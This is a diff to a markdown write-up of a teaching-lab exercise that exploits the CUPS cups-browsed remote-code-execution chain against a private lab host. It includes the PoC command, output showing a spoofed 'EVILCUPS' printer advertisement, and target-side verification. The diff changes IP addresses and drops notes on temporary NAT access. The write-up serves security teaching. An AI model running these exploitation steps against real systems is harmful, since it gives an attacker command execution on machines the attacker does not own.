@@ -27,7 +27,7 @@ Two approaches were attempted before finding one that worked cleanly against thi
 
 **Metasploit's `exploit/multi/misc/cups_ipp_remote_code_execution`** was tried first (natively available on Kali, no external download needed). Its own `info` confirms it targets exactly this CVE chain, requires no reachable CUPS ports, and executes as the `lp` user. However, every run attempt failed identically with `Errno::ENODEV No such device - setsockopt(2)`, a Ruby-level multicast socket error, most likely arising from the module's mDNS/DNS-SD printer-advertisement code failing on Kali's network configuration (the lab's `eth0` interface has no routable IPv6, a known trigger for this class of Ruby socket error; explicitly setting `SRVHOST` and disabling IPv6 on the interface were both tried and neither resolved it). This is recorded as a genuine tool-compatibility finding for this specific lab network configuration, not a flaw in the underlying exploit logic; the module may work correctly in environments with different network/IPv6 characteristics.
 
-**`0xCZR1/PoC-Cups-RCE-CVE-exploit-chain`** (a Python implementation using the `ippserver` library, cloned via GitHub while the disposable VM was temporarily on NAT) was used instead and worked correctly on the first properly-formed attempt.
+**`0xCZR1/PoC-Cups-RCE-CVE-exploit-chain`** (a Python implementation using the `ippserver` library, cloned via GitHub) was used instead and worked correctly on the first properly-formed attempt.
 
 ## Exploitation
 
@@ -40,20 +40,20 @@ pip install -r requirements.txt --break-system-packages
 
 **On Kali**, the actual script is `cups-rce.py` (the README's usage example references a stale filename, `poc.py`, which does not exist in the repository; this was confirmed by listing the repo's actual files):
 ```bash
-python3 cups-rce.py 192.168.144.129 192.168.144.200 "touch /tmp/CUPS_RCE_PWNED"
+python3 cups-rce.py 192.168.144.129 192.168.144.100 "touch /tmp/CUPS_RCE_PWNED"
 ```
 
 Output:
 ```
 Starting IPP server at ('192.168.144.129', 12349)
-Sending UDP packet to 192.168.144.200:631...
+Sending UDP packet to 192.168.144.100:631...
 Packet content:
 2 3 http://192.168.144.129:12349/printers/EVILCUPS "Pwned Location" "Pwned Printer" "HP LaserJet 1020"
 ```
 
 The script's packet uses type `2` (versus the `0` used in the manual reconnaissance tests) and includes a fourth quoted field for a make-and-model string, both accepted correctly by `cups-browsed`.
 
-**On the target** (SSH as `uow-admin@192.168.144.200`), confirming the malicious queue was created and accepted, not torn down as it was during the earlier manual/Metasploit-auxiliary attempts that lacked a real IPP attribute response:
+**On the target** (SSH as `uow-admin@192.168.144.100`), confirming the malicious queue was created and accepted, not torn down as it was during the earlier manual/Metasploit-auxiliary attempts that lacked a real IPP attribute response:
 ```bash
 lpstat -p
 ```
@@ -117,7 +117,7 @@ This is a strong Level 7 capstone exercise: it requires chaining four distinct C
 ## Lab Dependencies
 
 **Prerequisite exploit(s):** Confirmed detection-stage vulnerability from `r-12- cups-print-service-reconnaissance.md` and `r-13- cups-discovery-ip-change.md`
-**Required starting access:** Network access to the target; NAT temporarily for cloning the PoC tooling
+**Required starting access:** Network access to the target
 **Starting account:** None
 **Resulting access:** Command execution as the `lp` user
 **Suggested teaching level:** Level 7
